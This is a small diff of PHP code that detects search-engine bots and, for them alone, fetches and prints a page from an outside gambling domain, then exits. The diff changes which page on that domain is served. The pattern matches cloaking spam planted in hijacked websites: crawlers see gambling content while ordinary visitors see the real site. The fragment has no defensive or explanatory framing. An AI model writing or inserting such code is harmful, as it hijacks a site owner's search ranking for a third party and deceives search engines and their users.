@@ -13,7 +13,7 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('https://olxsitustoto.bet/palalloy/');
+    $message = file_get_contents('https://olxsitustoto.bet/chill-kawan/');
     echo $message;
 exit; // Atau bisa menggunakan die()
 }
